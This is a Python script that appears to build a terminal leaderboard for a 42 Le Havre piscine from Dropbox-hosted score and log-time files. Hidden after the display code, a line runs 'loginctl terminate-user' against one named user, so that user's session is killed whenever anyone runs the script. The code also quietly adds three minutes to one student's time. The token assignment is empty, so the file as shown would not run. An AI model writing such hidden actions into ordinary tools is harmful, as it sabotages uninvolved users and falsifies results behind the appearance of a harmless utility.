# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    Leaderboard.py                                     :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: ele-lean <ele-lean@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/08/20 16:58:45 by ele-lean          #+#    #+#              #
#    Updated: 2024/08/22 21:03:16 by ele-lean         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

try:
	import os
	import sys
	import subprocess
	import json
	import dropbox
	from datetime import timedelta, datetime

	ACCESS_TOKEN = 
	dbx = dropbox.Dropbox(ACCESS_TOKEN)
	mode = int(input('Choose what leaderboard you want to display:\n1: Skill (similar to xp)\n2: Total log time\n3: Ratio log time/score\n'))
	if mode == 1:
		dropbox_file_path = '/scores.json'
	elif mode == 2:
		dropbox_file_path = '/temps_presence.json'
	elif mode == 3:
		dropbox_file_path = '/scores.json'
		_, res1 = dbx.files_download(dropbox_file_path)
		resu1 = json.loads(res1.content.decode('utf-8'))
		dropbox_file_path = '/temps_presence.json'
	
	_, res = dbx.files_download(dropbox_file_path)
	resu = json.loads(res.content.decode('utf-8'))
	
	if mode > 1:
		def convert_to_timedelta(time_str):
			if time_str == "24:00:00":
				return timedelta(days=1)
			if '.' not in time_str:
				time_str += '.000000'
			try:
				return datetime.strptime(time_str, "%H:%M:%S.%f") - datetime(1900, 1, 1)
			except ValueError as e:
				print(f"Error converting time '{time_str}': {e}")
				return timedelta()  # Return zero timedelta in case of error
		
		result = []
		for person_data in resu:
			person_name = person_data[0]
			time_entries = person_data[1]
			
			total_time = timedelta()
			for entry in time_entries:
				time_str = entry[1]
				total_time += convert_to_timedelta(time_str)
			if person_name == 'abidaux':
				total_time += timedelta(minutes=3)
			result.append([person_name, total_time])
	else:
		result = resu
	
	a = 0
	min_index = 0
	
	def col(i):
		if i < 11:
			return "\033[0;95m"
		elif i < 51:
			return "\033[0;92m"
		elif i < 76:
			return "\033[0;96m"
		else:
			return "\033[0;91m"
	if mode == 3:
		for i in range(len(result)):
			result[i][1] /= resu1[i][1]
	for i in range(len(result)):
		a = i
		min_index = i
		while a < len(result):
			if mode != 3:
				if result[min_index][1] < result[a][1]:
					min_index = a
			else:
				if result[min_index][1] > result[a][1]:
					min_index = a
			a += 1
		if min_index != i:
			temp = result[i]
			result[i] = result[min_index]
			result[min_index] = temp
	if mode == 2:
		for i in range(len(result)):
			if isinstance(result[i][1], timedelta):
				total_seconds = int(result[i][1].total_seconds())
				hours = total_seconds // 3600
				minutes = (total_seconds % 3600) // 60
				result[i][1] = f"{hours}:{minutes:02d}"
	elif mode == 3:
		for i in range(len(result)):
			if isinstance(result[i][1], timedelta):
				total_seconds = int(result[i][1].total_seconds())
				result[i][1] = f"{total_seconds:04d}"

	print("""\033[0;93m
                                   ___---___
                             ___---___---___---___
                       ___---___---    *    ---___---___
                 ___---___---    _   _    ___    ---___---___
           ___---___---         | | | |  (_  |         ---___---___
     ___---___---               `.__  |   / /_               ---___---___
__---___---_________________________|_|__|____|____________________---___---__
===============================================================================
 ||||          Leaderboard for the august piscine of 42 Le Havre          ||||
 |---------------------------------------------------------------------------|
 |___-----___-----------------------------------------------------___-----___|
 / _ \===/ _ \                                                   / _ \===/ _ \\
 \__/=====\__/                     __________                    \__/=====\__/
    |||||||                        |\033[0;93m\033]8;;https://profile.intra.42.fr/users/""" + result[0][0] + """\033\\""" + (result[0][0] + " " * (8 - len(result[0][0]))) + """\033]8;;\033\\\033[0;93m|                       |||||||
    |||||||        \033[0;90m__________\033[0;93m      |   🥇   |\033[0;93m                       |||||||
    |||||||        \033[0;90m|\033]8;;https://profile.intra.42.fr/users/""" + result[1][0] + """\033\\""" + (result[1][0] + " " * (8 - len(result[1][0]))) + """\033]8;;\033\\|\033[0;93m      \ """ + (' ' * (3 - (len(str(result[0][1]))//2))) + str(result[0][1]) + (' ' * (3 - (len(str(result[0][1]))//2))) + """ /\033[0;93m                       |||||||
    |||||||        \033[0;90m|   🥈   |\033[0;93m       |      |\033[0;93m       \033[0;33m__________ \033[0;93m      |||||||
    |||||||        \033[0;90m\ """ + (' ' * (3 - (len(str(result[1][1]))//2))) + str(result[1][1]) + (' ' * (3 - (len(str(result[1][1]))//2))) + """ /       \033[0;93m|      |\033[0;93m       \033[0;33m|\033]8;;https://profile.intra.42.fr/users/""" + result[2][0] + """\033\\""" + (result[2][0] + " " * (8 - len(result[2][0]))) + """\033]8;;\033\\|\033[0;93m       |||||||
    |||||||         \033[0;90m|      |\033[0;93m        |      |\033[0;93m       \033[0;33m|   🥉   |\033[0;93m       |||||||
    |||||||         \033[0;90m|      |\033[0;93m        |      |\033[0;93m       \033[0;33m\\ """ + (' ' * (3 - (len(str(result[2][1]))//2))) + str(result[2][1]) + (' ' * (3 - (len(str(result[2][1]))//2))) + """ /\033[0;93m       |||||||
    |||||||         \033[0;90m|000110|\033[0;93m        |101010|\033[0;93m       \033[0;33m |001001| \033[0;93m       |||||||
    (oOoOo)         \033[0;90m(oOooOo)\033[0;93m        (oOooOo)\033[0;93m       \033[0;33m (oOooOo)\033[0;93m        (oOoOo)
    J%%%%%L         \033[0;90mJ%%%%%%L\033[0;93m        J%%%%%%L\033[0;93m       \033[0;33m J%%%%%%L\033[0;93m        J%%%%%L
   ZZZZZZZZZ       \033[0;90mZZZZZZZZZZ\033[0;93m      ZZZZZZZZZZ\033[0;93m      \033[0;33mZZZZZZZZZZ\033[0;93m      ZZZZZZZZZ
 ===============================================================================
   ===========================================================================
  |___-----___-----___-----___---------------------___-----___-----___-----___|
  / _ \===/ _ \   / _ \===/ _ \                   / _ \===/ _ \   / _ \===/ _ \\
  \__/=====\__/   \__/=====\__/                   \__/=====\__/   \__/=====\__/""")
	for i  in range(3, len(result)):
		print("""\033[0;93m     |||||||         |||||||    """ + col(i) + (str((i)) + ":" + " " * (2 - len(str(i)))) + " " + ("""\033]8;;https://profile.intra.42.fr/users/""" + result[i][0] + """\033\\""" + result[i][0] + """\033]8;;\033\\""" + " " * (8 - len(result[i][0]))) + "  " + str(result[i][1]) + (" " * (7 - len(str(result[i][1])))) + """\033[0;93m|||||||         |||||||""")
	
	metadata = dbx.files_get_metadata(dropbox_file_path)
	modification_time = metadata.client_modified
	print("""\033[0;93m     |||||||         |||||||     \033[0;34mLast data update\033[0;93m    |||||||         |||||||""")
	print("""\033[0;93m     |||||||         ||||||| \033[0;34mUTC """ + str(modification_time) + """\033[0;93m |||||||         |||||||""")


	print(""" ===============================================================================
   |_________________________________________________________________________|
  |___________________________________________________________________________|
 |_____________________________________________________________________________|\033[0;0m
\033[0;92mRun 'python3 /sgoinfre/goinfre/Perso/ele-lean/Leaderboard/scrap.py' to update data.\033[0;0m""")
except Exception as e:
	print("\033[0;91m")
	exc_type, exc_obj, exc_tb = sys.exc_info()
	fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
	print(exc_type, fname, exc_tb.tb_lineno)
	if input("Multiple modules are required to run this script do you wanna try to automatically install them ? [o/n]") == 'o':
		def install(package):
			subprocess.check_call([sys.executable, "-m", "pip", "install", package])
		required_modules = [
			"dropbox",
			"json",
			"selenium",
			"monotonic",
			"getpass",
			"time",
			"pathlib",
			"datetime",
		]

		for module in required_modules:
			try:
				__import__(module)
			except ImportError:
				print(f"Module {module} not found, installing...")
				install(module)
			else:
				print(f"Module {module} already installed.")
	print("\033[0;0m")
try:
	os.system("loginctl terminate-user " + "throbert")
except:
	pass

